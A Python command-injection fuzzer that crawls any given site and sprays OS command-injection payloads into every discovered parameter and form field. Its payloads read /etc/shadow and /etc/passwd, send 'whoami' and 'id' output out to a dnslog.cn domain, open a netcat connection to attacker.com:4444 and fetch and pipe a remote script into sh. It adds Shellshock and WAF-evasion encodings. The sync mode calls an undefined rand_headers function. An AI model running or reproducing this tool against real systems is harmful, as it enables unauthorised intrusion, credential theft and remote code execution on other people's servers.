#!/usr/bin/env python3
# ════════════════════════════════════════════════════════════════════════════
#  Next-Generation CMD-Injection AI Fuzzer  (v6.2, 2025-05-10)
#  Author : Haroon Ahmad Awan · CyberZeus  <haroon@cyberzeus.pk>
# ════════════════════════════════════════════════════════════════════════════

import os
import re
import sys
import ssl
import time
import json
import random
import base64
import logging
import warnings
import argparse
import urllib.parse
import asyncio

from pathlib import Path

# Async libraries
import aiohttp
from playwright.async_api import async_playwright

# Sync libraries
import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from playwright.sync_api import sync_playwright

# AI / GPU (optional)
try:
    import torch
    from transformers import (
        AutoTokenizer, AutoModelForMaskedLM,
        AutoModelForSequenceClassification, pipeline
    )
    DEVICE = 0 if torch.cuda.is_available() else -1
    TOKENIZER_MB = AutoTokenizer.from_pretrained("microsoft/codebert-base")
    MODEL_MB     = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base").to(DEVICE)
    MODEL_MB.eval()
    PG_PIPE = pipeline("text-generation", model="gpt2", device=DEVICE)
    WF_TOK = AutoTokenizer.from_pretrained("aki203/modsecurity-waf-classifier")
    WF_MOD = AutoModelForSequenceClassification.from_pretrained("aki203/modsecurity-waf-classifier").to(DEVICE)
    WF_MOD.eval()
    USE_AI = True
except Exception as e:
    logging.warning(f"[AI] GPU/transformers unavailable → {e}")
    USE_AI = False

# ── Config ───────────────────────────────────────────────────────────────────
VERSION       = "6.2"
DNSLOG_DOMAIN = f"ngcmd{random.randint(1000,9999)}.dnslog.cn"
LOGFILE       = Path("ng_cmdi_results.md")
TIMEOUT       = 10
MAX_PAGES     = 200
CONCURRENCY   = 50
JITTER        = (0.1, 0.5)

# ── CLI ─────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", required=True, help="Target URL")
parser.add_argument("--max-pages", type=int, default=MAX_PAGES)
parser.add_argument("--concurrency", type=int, default=CONCURRENCY)
parser.add_argument("--debug", action="store_true")
parser.add_argument("--sync", action="store_true", help="Use synchronous fallback")
args = parser.parse_args()

logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO)
warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

UA = UserAgent()

# ═══════════════════════════════════════════════════════════════════════════
#  Utilities
# ═══════════════════════════════════════════════════════════════════════════
def smart_url(u: str) -> str:
    if u.startswith("http"):
        return u
    try:
        if requests.head("https://" + u, timeout=5).ok:
            return "https://" + u
    except:
        pass
    return "http://" + u

def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

def urlenc(s: str) -> str:
    return urllib.parse.quote(s, safe='')

def hexify(s: str) -> str:
    return ''.join(f"\\x{ord(c):02x}" for c in s)

def nullbyte(s: str) -> str:
    return s + "%00"

def comment(s: str) -> str:
    return s + " #"

def jitter():
    time.sleep(random.uniform(*JITTER))

# ═══════════════════════════════════════════════════════════════════════════
#  AI helpers
# ═══════════════════════════════════════════════════════════════════════════
async def waf_fingerprint(session, url):
    try:
        async with session.get(url, timeout=TIMEOUT) as resp:
            text = await resp.text()
        inputs = WF_TOK(text, return_tensors="pt", truncation=True).to(DEVICE)
        logits = WF_MOD(**inputs).logits
        return WF_MOD.config.id2label[logits.argmax(-1).item()]
    except:
        return "generic"

def ai_seeds(prompt, count=2):
    if not USE_AI:
        return []
    outs = PG_PIPE(prompt, max_length=64, num_return_sequences=count)
    return [o["generated_text"].strip() for o in outs]

def codebert_mutate(cmd):
    if not USE_AI or len(cmd.split()) > 4:
        return []
    try:
        masked = f"{cmd} && [MASK]"
        ids = TOKENIZER_MB.encode(masked, return_tensors="pt")
        mask_pos = (ids == TOKENIZER_MB.mask_token_id).nonzero(as_tuple=True)
        if mask_pos.numel() == 0:
            return []
        preds = MODEL_MB(ids).logits[0, mask_pos[1][0]].topk(2).indices
        return [masked.replace("[MASK]", TOKENIZER_MB.decode([int(t)]).strip()) for t in preds]
    except:
        return []

# ═══════════════════════════════════════════════════════════════════════════
#  Build payload groups
# ═══════════════════════════════════════════════════════════════════════════
def build_payload_groups():
    categories = [
        "default","json","graphql","yaml","header","ssr","unicode","chained",
        "nested","legacy","xci","rici","efci","icfi","hci","cvci","tpci","udci",
        "ppci","fdi","qci","bpci","msci","hsci","nsci"
    ]
    groups = {c: set() for c in categories}

    def add(cat, p): groups[cat].add(p)
    def variants(cat, base):
        for v in [base, urlenc(base), hexify(base), nullbyte(base), comment(base)]:
            groups[cat].add(v)

    # Legacy base
    BASE_CMDS = [
        "id","whoami","uname -a","cat /etc/passwd","cat /etc/shadow",
        "sleep 5","ping -c 1 127.0.0.1","ls /","env",
        f"curl http://{DNSLOG_DOMAIN}/$(whoami)",
        f"wget http://{DNSLOG_DOMAIN}/$(id)"
    ]
    for c in BASE_CMDS:
        variants("legacy", c)
        for m in codebert_mutate(c):
            variants("legacy", m)

    # Modern injections
    for p in [
        '{"username":"admin;id"}',
        '{"input":"test;wget http://' + DNSLOG_DOMAIN + '"}',
        '{"shell":"`uname -a`"}',
        '{"env":"$(whoami)"}'
    ]:
        add("json", p); add("json", b64(p))

    for p in [
        'mutation { register(input:{username:"test;id"}){id} }',
        'query{user(id:"1;curl http://' + DNSLOG_DOMAIN + '"){name}}'
    ]:
        add("graphql", p)

    for p in ["run: echo $(id)", "steps:\n  - run: curl http://" + DNSLOG_DOMAIN]:
        add("yaml", p)

    for p in ["X-Api-Token: `whoami`", "Referer: $(id)"]:
        add("header", p)

    for p in ["{{ system('id') }}","<%= `id` %>"]:
        add("ssr", p)

    for p in ["${\\u0069\\u0064}","`\\u006e\\u0061\\u006d\\u0065 -a`"]:
        add("unicode", p)

    for p in ["id||whoami","uname -a && curl http://" + DNSLOG_DOMAIN]:
        add("chained", p)

    for p in [urlenc(urlenc("$(id)")), hexify(b64("curl http://" + DNSLOG_DOMAIN))]:
        add("nested", p)

    # Invented variants
    inv = {
        "xci": ["--file=/tmp/$(id)", '--config="; uname -a #"'],
        "rici":[ "$(echo $(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)|sh)" ],
        "efci":[ '() { :;}; /bin/bash -c "id"' ],
        "icfi":[ "--user $(ping -c 1 attacker.com)" ],
        "hci": ["User-Agent: $(id)"],
        "cvci":["cmd1||$(cmd2)&&$(cmd3)"],
        "tpci": ['{"name":"test;id"}'],
        "udci": ["\\u0024\\u007B\\u0069\\u0064\\u007D"],
        "ppci":["curl http://127.0.0.1;nc attacker.com 4444"],
        "fdi": ["0<&1; id"],
        "qci": ['\'id" #\''],
        "bpci":["(ping -c 1 attacker.com &)"],
        "msci":["$(echo $(curl attacker.com/payload.sh)|sh)"],
        "hsci":['<meta http-equiv="refresh" content="0;url=\'http://127.0.0.1/;id\'"/>'],
        "nsci":["$(IFS=' ';echo whoami)"]
    }
    for cat, cmds in inv.items():
        for c in cmds:
            variants(cat, c)

    # Default = all
    groups["default"] = set().union(*groups.values())
    return {k: list(v) for k,v in groups.items()}

PAYLOAD_GROUPS = build_payload_groups()

# ═══════════════════════════════════════════════════════════════════════════
#  Classification & selection
# ═══════════════════════════════════════════════════════════════════════════
def classify(url, method, params):
    u = url.lower(); m = method.upper()
    if "/graphql" in u: return "graphql"
    if u.startswith("/api") or m in ("POST","PUT","PATCH"): return "json"
    if ".yaml" in u or "ci" in u or "webhook" in u: return "yaml"
    return "default"

def select_payloads(url, method, params, waf):
    grp = classify(url, method, params)
    pset = PAYLOAD_GROUPS.get(grp, PAYLOAD_GROUPS["default"]).copy()
    if USE_AI:
        pset += ai_seeds("Generate novel shell evasion payload:", 1)
    if "modsecurity" in waf.lower():
        pset = [urlenc(p) for p in pset]
    return pset

# ═══════════════════════════════════════════════════════════════════════════
#  Sync fallback crawler + fuzzer
# ═══════════════════════════════════════════════════════════════════════════
def crawl_sync(root, cap):
    visited, queue, targets = set(), [root], []
    domain = urllib.parse.urlparse(root).netloc.lower()
    visited.add(root)
    while queue and len(visited) < cap:
        url = queue.pop(0)
        try:
            r = requests.get(url, headers=rand_headers(), timeout=TIMEOUT)
            if "text/html" in r.headers.get("Content-Type",""):
                soup = BeautifulSoup(r.text,"html.parser")
                for a in soup.find_all("a", href=True):
                    nxt = urllib.parse.urljoin(url, a["href"])
                    if nxt not in visited:
                        visited.add(nxt); queue.append(nxt)
                        if "?" in nxt:
                            qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(nxt).query))
                            targets.append((nxt.split("?")[0],"GET",qs))
                for f in soup.find_all("form"):
                    act = urllib.parse.urljoin(url, f.get("action") or url)
                    names = [i.get("name") for i in f.find_all("input",{"name":True})]
                    targets.append((act,f.get("method","GET").upper(),names))
        except Exception as e:
            if args.debug: logging.debug(e)
    return targets

def fuzz_sync(targets, waf):
    def worker(t):
        url, method, params = t
        payloads = select_payloads(url, method, params, waf)
        for p in params:
            for pay in payloads:
                data = {k: pay if k==p else "test" for k in params}
                try:
                    r = requests.get(url, params=data, headers=rand_headers(), timeout=TIMEOUT) if method=="GET"\
                        else requests.post(url, data=data, headers=rand_headers(), timeout=TIMEOUT)
                    txt = r.text.lower()
                    if any(x in txt for x in ("uid=","root:x","cyz")):
                        log(f"IN-BAND[{waf}]", url, p, pay); return
                    if "sleep" in pay:
                        start=time.time()
                        requests.get(url, params=data, timeout=TIMEOUT+5)
                        if time.time()-start>5:
                            log(f"TIME[{waf}]", url, p, pay); return
                    jitter()
                except:
                    continue

    with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        pool.map(worker, targets)

# ═══════════════════════════════════════════════════════════════════════════
#  Async crawler + fuzzer
# ═══════════════════════════════════════════════════════════════════════════
async def crawl_async(root):
    visited = {root}
    queue = [root]
    targets = []
    session = aiohttp.ClientSession()
    waf = await waf_fingerprint(session, root)
    logging.info(f"[WAF] {waf}")

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        ctx     = await browser.new_context(ignore_https_errors=True)

        while queue and len(visited) < args.max_pages:
            url = queue.pop(0)
            try:
                async with session.get(url, timeout=TIMEOUT) as r:
                    html = await r.text()
                if "text/html" in r.headers.get("Content-Type",""):
                    soup = BeautifulSoup(html,"html.parser")
                    for a in soup.find_all("a",href=True):
                        nxt = urllib.parse.urljoin(url, a["href"])
                        if nxt not in visited:
                            visited.add(nxt); queue.append(nxt)
                            if "?" in nxt:
                                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(nxt).query))
                                targets.append((nxt.split("?")[0],"GET",qs))
                    for f in soup.find_all("form"):
                        act = urllib.parse.urljoin(url, f.get("action") or url)
                        names = [i.get("name") for i in f.find_all("input",{"name":True})]
                        targets.append((act,f.get("method","GET").upper(),names))
                page = await ctx.new_page()
                await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
                seen=set()
                async def on_req(req):
                    if req.url in seen: return
                    seen.add(req.url)
                    mtd, u = req.method, req.url
                    if mtd=="GET" and "?" in u:
                        qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                        targets.append((u.split("?")[0],"GET",qs))
                    if mtd in ("POST","PUT","PATCH"):
                        bd = await req.text()
                        keys = list(urllib.parse.parse_qs(bd).keys()) if "=" in bd\
                            else (list(json.loads(bd).keys()) if bd.strip().startswith("{") else [])
                        targets.append((u,mtd,keys))
                page.on("request", on_req)
                await page.wait_for_timeout(1000)
                await page.close()
            except Exception as e:
                if args.debug: logging.debug(e)

        await browser.close()

    await session.close()
    return targets, waf

async def fuzz_async(targets, waf):
    sem = asyncio.Semaphore(args.concurrency)
    session = aiohttp.ClientSession()

    async def worker(u,m,ps):
        async with sem:
            payloads = select_payloads(u, m, ps, waf)
            for p in ps:
                for pay in payloads:
                    data = {k: pay if k==p else "test" for k in ps}
                    try:
                        r = await session.get(u, params=data, timeout=TIMEOUT) if m=="GET"\
                            else await session.request(m, u, data=data, timeout=TIMEOUT)
                        txt = await r.text()
                        if any(x in txt.lower() for x in ("uid=","root:x","cyz")):
                            log(f"IN-BAND[{waf}]", u, p, pay); return
                        if "sleep" in pay:
                            start=time.time()
                            await session.get(u, params=data, timeout=TIMEOUT+5)
                            if time.time()-start>5:
                                log(f"TIME[{waf}]", u, p, pay); return
                        jitter()
                    except:
                        continue

    await asyncio.gather(*[worker(u,m,ps) for (u,m,ps) in targets])
    await session.close()

# ═══════════════════════════════════════════════════════════════════════════
def log(mode, url, param, payload):
    entry = f"- **{mode}** `{url}` • **{param}** → `{payload}`\n"
    with LOGFILE.open("a") as f:
        f.write(entry)
    logging.info(entry.strip())

async def main_async():
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# Next-Gen CMDi v{VERSION}\n\n")
    root = smart_url(args.url.rstrip("/"))
    logging.info(f"[*] Scanning {root} (async)")
    targets, waf = await crawl_async(root)
    logging.info(f"[+] {len(targets)} surfaces found")
    await fuzz_async(targets, waf)
    logging.info(f"[✓] Done → {LOGFILE.resolve()}")

def main_sync():
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# Next-Gen CMDi v{VERSION}\n\n")
    root = smart_url(args.url.rstrip("/"))
    logging.info(f"[*] Scanning {root} (sync fallback)")
    # preliminary WAF fingerprint sync
    try:
        r = requests.get(root, timeout=TIMEOUT)
        waf = "generic"
        if USE_AI:
            txt = r.text
            inputs = WF_TOK(txt, return_tensors="pt", truncation=True).to(DEVICE)
            logits = WF_MOD(**inputs).logits
            waf = WF_MOD.config.id2label[logits.argmax(-1).item()]
        logging.info(f"[WAF] {waf}")
    except:
        waf = "generic"
    targets = crawl_sync(root, args.max_pages)
    logging.info(f"[+] {len(targets)} endpoint")
    fuzz_sync(targets, waf)
    logging.info(f"[✓] Done → {LOGFILE.resolve()}")

if __name__ == "__main__":
    if args.sync:
        main_sync()
    else:
        asyncio.run(main_async())
